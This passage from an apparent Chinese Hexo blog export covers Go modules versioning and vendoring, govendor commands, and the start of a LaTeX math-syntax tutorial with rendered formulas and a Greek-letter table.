class="line">v1.2.1</span><br><span class="line">v1.3.0</span><br><span class="line">v1.4.0</span><br><span class="line">v1.5.0</span><br><span class="line">v1.5.1</span><br><span class="line">v1.5.2</span><br><span class="line">v1.5.3-pre1</span><br><span class="line">v2.0.0</span><br><span class="line">v2.0.1</span><br><span class="line">v3.0.0</span><br><span class="line">v3.1.0</span><br><span class="line">(END)</span><br></pre></td></tr></table></figure><ul><li>根据上面的说明，想必你会看到一个问题，当我们升级主版本号的时候，要更改 module 名称，也就是上面所说的加上版本号，这就存在一个问题，如果我们要更新到主版本号的依赖就没有这么简单了，因为升级的依赖包路径都需要修改，这个在其它语言包管理以及 Go 第三方包管理工具都不存在的一点。</li><li>如下所示，升级 <a href="http://rsc.io/quote">rsc.io/quote</a> 到 v3 版本。注意一点，作为例子这里包作者对函数也加上了版本，其实大部分人是不会加的。这个模式叫做 semantic import versioning，也是备受争议，大多数人认为这个没有特别大的作用，而维护者则认为这是为了 Go 下一个十年的必要条件。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line"></span><br><span class="line">&quot;rsc.io&#x2F;quote&#x2F;v3&quot;</span><br><span class="line">)</span><br><span class="line">func main() &#123;</span><br><span class="line">fmt.Println(quote.HelloV3())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>对于内部开发我觉得还挺好，让大家都了解，不要随意加入破坏性更新。</li><li>不过由于这个不讨喜功能，不同版本可以存在同一个包了。补充一句，对于 v0 和 v1 版本并不需要加入到 import path 内。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line">import (</span><br><span class="line">&quot;fmt&quot;</span><br><span class="line"></span><br><span class="line">q1 &quot;rsc.io&#x2F;quote&quot;</span><br><span class="line">&quot;rsc.io&#x2F;quote&#x2F;v3&quot;</span><br><span class="line">)</span><br><span class="line">func main() &#123;</span><br><span class="line">fmt.Println(quote.HelloV3())</span><br><span class="line">fmt.Println(q1.Hello())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="从老项目迁移"><a class="markdownIt-Anchor" href="#从老项目迁移"></a> 从老项目迁移</h2><ul><li>从很多第三方的包管理工具迁移到 gomod 特别简单，直接运行 go mod init 即可。</li><li>如果没有使用任何第三方包管理工具，除了运行 go mod init 初始化以外，还要使用 go get ./… 下载安装所有依赖包，并更新 go.mod 和 go.sum 文件。</li><li>默认情况下，go get 命令使用 @latest 版本控制符对所有依赖进行下载，如果想要更改某一个包的版本，可以使用 go mod edit --require 命令，比如要更新 <a href="http://rsc.io/quote">rsc.io/quote</a> 到 v3.1.0 版本。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go mod edit --require&#x3D;rsc.io&#x2F;quote@v3.1.0</span><br></pre></td></tr></table></figure><h2 id="使用-vendor-目录"><a class="markdownIt-Anchor" href="#使用-vendor-目录"></a> 使用 vendor 目录</h2><ul><li>如果你不喜欢 go mod 的缓存方式，你可以使用 go mod vendor 回到 godep 或 govendor 使用的 vendor 目录进行包管理的方式。</li><li>当然这个命令并不能让你从godep之类的工具迁移到 go modules，它只是单纯地把 go.sum 中的所有依赖下载到 vendor 目录里，如果你用它迁移 godep 你会发现 vendor 目录里的包会和 godep 指定的产生相当大的差异，所以请务必不要这样做。</li><li>使用 go build -mod=vendor 来构建项目，因为在 go modules 模式下 go build 是屏蔽 vendor 机制的，所以需要特定参数重新开启 vendor 机制:</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go build -mod&#x3D;vendor</span><br><span class="line">.&#x2F;hello</span><br><span class="line">hello world!</span><br></pre></td></tr></table></figure><ul><li>构建成功。当发布时也只需要和使用 godep 一样将 vendor 目录带上即可。</li></ul><h1 id="阅读更多"><a class="markdownIt-Anchor" href="#阅读更多"></a> 阅读更多</h1><p>上面说到 dep 这个社区维护的准官方管理工具无奈结束使命被 gomod 替代，关于这段故事，你可以阅读这篇文章：<a href="https://zhuanlan.zhihu.com/p/41627929">《关于 Go Module 的争吵》</a></p><p><a href="https://zhuanlan.zhihu.com/p/59687626">原文链接</a><br /><a href="https://juejin.im/post/5c7fc2b1f265da2dac4575fc">原文链接2</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go使用vendor管理目录</title>
      <link href="/2020/06/06/govender/"/>
      <url>/2020/06/06/govender/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>golang的依赖包默认是从<code>GOROOT</code>和<code>GOPATH</code>去找，vendor可以在项目众建立<code>vendor</code>目录，方便不同机器直接使用所依赖的包。</p></blockquote><a id="more"></a><h1 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h1><ul><li><code>vendor</code>目录允许不同的代码库拥有它自己的依赖包，并且不同于其他代码库的版本，这就很好的做到了工程的隔离。</li><li>随着Go 1.5 release版本的发布，vendor目录被添加到除了GOPATH和GOROOT之外的依赖目录查找的解决方案。,但需要手动设置环境变量 GO15VENDOREXPERIMENT=1</li><li>在发布 1.6 版本时，该环境变量的值已经默认设置为 1 了，该值可以使用 go env 命令查看。</li><li>在发布 1.7 版本时，已去掉该环境变量，默认开启 vendor 特性。</li><li><strong>注意</strong>：即使使用vendor，也必须在GOPATH中，在go的工具链中，你逃不掉GOPATH的</li><li>查找依赖包路径顺序<ul><li>当前包下的vendor目录。</li><li>向上级目录查找，直到找到src下的vendor目录。</li><li>在GOPATH下面查找依赖包。</li><li>在GOROOT目录下查找</li></ul></li><li>建议<ul><li>一个库工程（不包含main的package）不应该在自己的版本控制中存储外部的包在vendor\目录中，除非他们有特殊原因并且知道为什么要这么做。</li><li>在一个应用中，（包含main的package），建议只有一个vendor目录在代码库一级目录。</li></ul></li></ul><h1 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h1><h2 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h2><ul><li>在终端执行安装命令即可</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go get -u github.com&#x2F;kardianos&#x2F;govendor</span><br></pre></td></tr></table></figure><ul><li>为了方便快捷使用 govendor，建议将 $GOPATH/bin 添加到 PATH 中。Linux/macOS 如下设置：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;&quot;$GOPATH&#x2F;bin:$PATH&quot;</span><br></pre></td></tr></table></figure><h2 id="项目使用"><a class="markdownIt-Anchor" href="#项目使用"></a> 项目使用</h2><ul><li>初始化：在项目根目录下执行以下命令进行 vendor 初始化：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">govendor init</span><br></pre></td></tr></table></figure><ul><li>项目根目录下即会自动生成 vendor 目录和 vendor.json 文件。此时 vendor.json 文件内容为：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;comment&quot;: &quot;&quot;,</span><br><span class="line">&quot;ignore&quot;: &quot;test&quot;,</span><br><span class="line">&quot;package&quot;: [],</span><br><span class="line">&quot;rootPath&quot;: &quot;govendor-example&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>将已被引用且在 $GOPATH 下的所有包复制到 vendor 目录</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">govendor add +external</span><br><span class="line">govendor add +e &#x2F;&#x2F;简写</span><br></pre></td></tr></table></figure><ul><li>仅从 $GOPATH 中复制指定包</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">govendor add gopkg.in&#x2F;yaml.v2</span><br></pre></td></tr></table></figure><ul><li>列出代码中所有被引用到的包及其状态</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">govendor list</span><br></pre></td></tr></table></figure><ul><li>列出一个包被哪些包引用</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">govendor list -v fmt</span><br></pre></td></tr></table></figure><ul><li>从远程仓库添加或更新某个包(不会在 $GOPATH 也存一份)</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">govendor fetch golang.org&#x2F;x&#x2F;net&#x2F;context</span><br></pre></td></tr></table></figure><ul><li>安装指定版本的包</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">govendor fetch golang.org&#x2F;x&#x2F;net&#x2F;context@a4bbce9fcae005b22ae5443f6af064d80a6f5a55</span><br><span class="line">govendor fetch golang.org&#x2F;x&#x2F;net&#x2F;context@v1   # Get latest v1.*.* tag or branch.</span><br><span class="line">govendor fetch golang.org&#x2F;x&#x2F;net&#x2F;context@&#x3D;v1  # Get the tag or branch named &quot;v1&quot;.</span><br></pre></td></tr></table></figure><ul><li>只格式化项目自身代码(vendor 目录下的不变动)</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">govendor fmt +local</span><br></pre></td></tr></table></figure><ul><li>只构建编译项目内部的包</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">govendor install +local</span><br></pre></td></tr></table></figure><ul><li>只测试项目内部的测试案例</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">govendor test +local</span><br></pre></td></tr></table></figure><ul><li>构建所有 vendor 包</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">govendor install +vendor,^program</span><br></pre></td></tr></table></figure><ul><li>拉取所有依赖的包到 vendor 目录(包括 $GOPATH 存在或不存在的包)</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">govendor fetch +out</span><br></pre></td></tr></table></figure><ul><li>包已在 vendor 目录，但想从 $GOPATH 更新</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">govendor update +vendor</span><br></pre></td></tr></table></figure><ul><li>已修改了 $GOPATH 里的某个包，现在想将已修改且未提交的包更新到 vendor</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">govendor update -uncommitted &lt;updated-package-import-path&gt;</span><br></pre></td></tr></table></figure><ul><li>Fork 了某个包，但尚未合并，该如何引用到最新的代码包</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">govendor fetch github.com&#x2F;normal&#x2F;pkg::github.com&#x2F;myfork&#x2F;pkg</span><br></pre></td></tr></table></figure><ul><li>此时将从 myfork 拉取代码，而不是 normal。</li><li>vendor.json 中记录了依赖包信息，该如何拉取更新</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">govendor sync</span><br></pre></td></tr></table></figure><h2 id="govendor-子命令"><a class="markdownIt-Anchor" href="#govendor-子命令"></a> govendor 子命令</h2><ul><li>各子命令详细用法可通过 govendor COMMAND -h 或阅读<a href="github.com/kardianos/govendor/context">官方链接</a>查看源码包如何实现的。</li></ul><table><thead><tr><th>子命令</th><th>功能</th></tr></thead><tbody><tr><td>init</td><td>创建 vendor 目录和 vendor.json 文件</td></tr><tr><td>list</td><td>列出&amp;过滤依赖包及其状态</td></tr><tr><td>add</td><td>从 $GOPATH 复制包到项目 vendor 目录</td></tr><tr><td>update</td><td>从 $GOPATH 更新依赖包到项目 vendor 目录</td></tr><tr><td>remove</td><td>从 vendor 目录移除依赖的包</td></tr><tr><td>status</td><td>列出所有缺失、过期和修改过的包</td></tr><tr><td>fetch</td><td>从远程仓库添加或更新包到项目 vendor 目录(不会存储到 $GOPATH)</td></tr><tr><td>sync</td><td>根据 vendor.json 拉取相匹配的包到 vendor 目录</td></tr><tr><td>migrate</td><td>从其他基于 vendor 实现的包管理工具中一键迁移</td></tr><tr><td>get</td><td>与 go get 类似，将包下载到 $GOPATH，再将依赖包复制到 vendor 目录</td></tr><tr><td>license</td><td>列出所有依赖包的 LICENSE</td></tr><tr><td>shell</td><td>可一次性运行多个 govendor 命令</td></tr></tbody></table><h2 id="govendor-状态参数"><a class="markdownIt-Anchor" href="#govendor-状态参数"></a> govendor 状态参数</h2><ul><li>支持状态参数的子命令有：list、add、update、remove、fetch</li></ul><p>|状态|缩写|含义|<br />|–|--|<br />|+local|l|本地包，即项目内部编写的包|<br />|+external|e|外部包，即在 GOPATH 中、却不在项目 vendor 目录|<br />|+vendor|v|已在 vendor 目录下的包|<br />|+std|s|标准库里的包|<br />|+excluded|x|明确被排除的外部包|<br />|+unused|u|未使用的包，即在 vendor 目录下，但项目中并未引用到|<br />|+missing|m|被引用了但却找不到的包|<br />|+program|p|主程序包，即可被编译为执行文件的包|<br />|+outside||相当于状态为 +external +missing|<br />|+all||所有包|</p><h1 id="go-modules"><a class="markdownIt-Anchor" href="#go-modules"></a> Go modules</h1><ul><li>普大喜奔的是，从 Go 1.11 版本开始，官方已内置了更为强大的 Go modules 来一统多年来 Go 包依赖管理混乱的局面(Go 官方之前推出的 dep 工具也几乎胎死腹中)，并且将在 1.13 版本中正式默认开启。</li><li>目前已受到社区的看好和强烈推荐，建议新项目采用 Go modules。</li></ul><p><a href="https://shockerli.net/post/go-package-manage-tool-govendor/#go-modules">原文链接</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> programme </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Latex语法</title>
      <link href="/2020/06/04/latex/"/>
      <url>/2020/06/04/latex/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>latex就是一个方便编辑数学公式的一个库，简单汇总一下他的用法。</p></blockquote><a id="more"></a><h2 id="latex介绍"><a class="markdownIt-Anchor" href="#latex介绍"></a> Latex介绍</h2><ul><li>Donald为了更好的在他的著作里编写数学公式，发明了Tex这种宏语言，专门排版数学公式。Leslie封装了Tex，并自定义了更多的宏指令，成为了LaTeX。现在是国际通用的排版系统，很多论文收稿的排版要求都是LaTex，word是不接收的。</li><li>妈咪说公布了一个在线的公式编辑的网站，生成latex更方便了，非常好用：<a href="https://www.latexlive.com">www.latexlive.com</a></li></ul><h2 id="基本语法"><a class="markdownIt-Anchor" href="#基本语法"></a> 基本语法</h2><ul><li>LaTex Math的语法多且杂，我们是没法完全记住这些语法的。查询手册在手，天下我有，这里比较推荐名校莱斯Rice大学的一个语法手册，莱斯大学<a href="https://www.caam.rice.edu/~heinken/latex/symbols.pdf">LaTex Math在线PDF手册</a>。</li></ul><h3 id="排版格式"><a class="markdownIt-Anchor" href="#排版格式"></a> 排版格式</h3><ul><li>行内公式排版：左右$好像不能有空格</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$c &#x3D; \sqrt&#123;a^&#123;2&#125;+b_&#123;xy&#125;^&#123;2&#125;+e^&#123;x&#125;&#125;$</span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mo>=</mo><msqrt><mrow><msup><mi>a</mi><mn>2</mn></msup><mo>+</mo><msubsup><mi>b</mi><mrow><mi>x</mi><mi>y</mi></mrow><mn>2</mn></msubsup><mo>+</mo><msup><mi>e</mi><mi>x</mi></msup></mrow></msqrt></mrow><annotation encoding="application/x-tex">c = \sqrt{a^{2}+b_{xy}^{2}+e^{x}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.84em;vertical-align:-0.6765000000000001em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1635em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7401079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.590392em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.1235em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width='400em' height='1.8800000000000001em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M1001,80H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5c4,-6.7,10,-10,18,-10zM1001 80H400000v40H1013z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6765000000000001em;"><span></span></span></span></span></span></span></span></span></p><ul><li>块公式排版：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$$ c &#x3D; \sqrt&#123;a^&#123;2&#125;+b_&#123;xy&#125;^&#123;2&#125; +e^&#123;x&#125;&#125; $$</span><br></pre></td></tr></table></figure><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mo>=</mo><msqrt><mrow><msup><mi>a</mi><mn>2</mn></msup><mo>+</mo><msubsup><mi>b</mi><mrow><mi>x</mi><mi>y</mi></mrow><mn>2</mn></msubsup><mo>+</mo><msup><mi>e</mi><mi>x</mi></msup></mrow></msqrt></mrow><annotation encoding="application/x-tex">c = \sqrt{a^{2}+b_{xy}^{2} +e^{x}} </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.84em;vertical-align:-0.6276249999999999em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2123750000000002em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7401079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span style="top:-2.989em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.590392em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.1723749999999997em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width='400em' height='1.8800000000000001em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M1001,80H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5c4,-6.7,10,-10,18,-10zM1001 80H400000v40H1013z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.6276249999999999em;"><span></span></span></span></span></span></span></span></span></span></p><h3 id="转义"><a class="markdownIt-Anchor" href="#转义"></a> 转义</h3><ul><li>以下几个字符：<code># $ % &amp; ~ _ ^ \ &#123; &#125;</code>有特殊意义，需要表示这些字符时，需要转义，即在每个字符前加上<code>\</code>。</li><li><code>\boxed</code>命令给公式加一个方框。</li></ul><h3 id="希腊字母"><a class="markdownIt-Anchor" href="#希腊字母"></a> 希腊字母</h3><ul><li>希腊字母有大写和小写之分，这个大小写是由LaTex的首字母是否大小写来控制的。</li></ul><table><thead><tr><th>希腊字母</th><th>LaTeX形式</th></tr></thead><tbody><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mi mathvariant="normal">A</mi></mrow><annotation encoding="application/x-tex">\alpha \Alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mord"><span class="mord mathrm">A</span></span></span></span></span></td><td><code>\alpha \Alpha</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>β</mi><mi mathvariant="normal">B</mi></mrow><annotation encoding="application/x-tex">\beta \Beta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mord"><span class="mord mathrm">B</span></span></span></span></span></td><td><code>\beta \Beta</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>γ</mi><mi mathvariant="normal">Γ</mi></mrow><annotation encoding="application/x-tex">\gamma \Gamma</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span><span class="mord">Γ</span></span></span></span></td><td><code>\gamma \Gamma</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>δ</mi><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\delta \Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="mord">Δ</span></span></span></span></td><td><code>\delta \Delta</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ϵ</mi><mi>ε</mi><mi mathvariant="normal">E</mi></mrow><annotation encoding="application/x-tex">\epsilon \varepsilon \Epsilon</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">ϵ</span><span class="mord mathdefault">ε</span><span class="mord"><span class="mord mathrm">E</span></span></span></span></span></td><td><code>\epsilon \varepsilon \Epsilon</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ζ</mi><mi mathvariant="normal">Z</mi></mrow><annotation encoding="application/x-tex">\zeta \Zeta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.07378em;">ζ</span><span class="mord"><span class="mord mathrm">Z</span></span></span></span></span></td><td><code>\zeta \Zeta</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>η</mi><mi mathvariant="normal">H</mi></mrow><annotation encoding="application/x-tex">\eta \Eta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="mord"><span class="mord mathrm">H</span></span></span></span></span></td><td><code>\eta \Eta</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>θ</mi><mi>ϑ</mi><mi mathvariant="normal">Θ</mi></mrow><annotation encoding="application/x-tex">\theta \vartheta \Theta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">θ</span><span class="mord mathdefault">ϑ</span><span class="mord">Θ</span></span></span></span></td><td><code>\theta \vartheta \Theta</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>ι</mi><mi mathvariant="normal">I</mi></mrow><annotation encoding="application/x-tex">\iota \Iota</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">ι</span><span class="mord"><span class="mord mathrm">I</span></span></span></span></span></td><td><code>\iota \Iota</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>κ</mi><mi mathvariant="normal">K</mi></mrow><annotation encoding="application/x-tex">\kappa \Kappa</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">κ</span><span class="mord"><span class="mord mathrm">K</span></span></span></span></span></td><td><code>\kappa \Kappa</code></td></tr><tr><td><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>λ</mi><mi mathvariant="normal">Λ</mi></mrow><annotation encoding="application/x-tex">\lambda \Lambda</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">λ</span><span class="mord">Λ</span></span></span></span></td><td><code>\lambda 